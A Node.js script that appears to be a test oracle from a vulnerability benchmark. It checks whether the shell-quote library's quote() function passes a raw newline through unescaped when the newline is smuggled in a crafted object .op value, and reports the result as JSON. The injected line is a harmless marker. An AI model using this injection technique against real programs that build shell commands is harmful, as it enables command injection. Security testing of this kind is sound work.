'use strict';

function finish(result) {
  console.log('ORACLE_RESULT ' + JSON.stringify(result));
}

let shellQuote;
try {
  shellQuote = require('shell-quote');
} catch (e) {
  finish({
    operation_completed: false,
    exploit_succeeded: false,
    evidence: 'module resolution failed: ' + String(e && e.message || e)
  });
  process.exit(0);
}

const quote = shellQuote && shellQuote.quote;

if (typeof quote !== 'function') {
  finish({
    operation_completed: false,
    exploit_succeeded: false,
    evidence: 'shell-quote.quote is not a function after require'
  });
  process.exit(0);
}

const marker = 'oracle_marker_' + process.pid + '_' + Date.now();

let benignResult;
try {
  benignResult = quote(['echo', 'hello-' + marker]);
} catch (e) {
  finish({
    operation_completed: false,
    exploit_succeeded: false,
    evidence: 'benign quote() call threw: ' + String(e && e.message || e)
  });
  process.exit(0);
}

if (typeof benignResult !== 'string' || benignResult.indexOf(marker) === -1) {
  finish({
    operation_completed: false,
    exploit_succeeded: false,
    evidence: 'benign quote() call did not produce expected output: ' + JSON.stringify(benignResult)
  });
  process.exit(0);
}

// Benign operation proven to work.
const operation_completed = true;

let maliciousResult;
let exploit_succeeded = false;
let evidence;

try {
  // Use a custom, non-'glob' op value that itself contains an embedded
  // raw newline. The vulnerable quote() concatenates .op verbatim without
  // checking for or escaping line terminators in arbitrary op strings,
  // allowing injection of extra lines into the quoted output. This avoids
  // relying solely on the 'glob' keyword path which some patches special-case.
  const injectedOp = 'MY_OP_' + marker + '\ninjected-line-' + marker;
  maliciousResult = quote([
    'echo',
    { op: injectedOp, pattern: '*' }
  ]);

  if (typeof maliciousResult !== 'string') {
    evidence = 'quote() with object .op value did not return a string: ' + JSON.stringify(maliciousResult);
    exploit_succeeded = false;
  } else if (maliciousResult.indexOf('\n') !== -1) {
    exploit_succeeded = true;
    const safeSnippet = JSON.stringify(maliciousResult);
    evidence = 'quote() output contains a raw, unescaped newline character injected via a crafted object .op value: ' + safeSnippet;
  } else {
    exploit_succeeded = false;
    evidence = 'quote() output did not contain a raw newline; payload appears escaped or rejected: ' + JSON.stringify(maliciousResult);
  }
} catch (e) {
  exploit_succeeded = false;
  evidence = 'malicious quote() call threw (treated as blocked since benign op already succeeded): ' + String(e && e.message || e);
}

finish({
  operation_completed: operation_completed,
  exploit_succeeded: exploit_succeeded,
  evidence: evidence
});
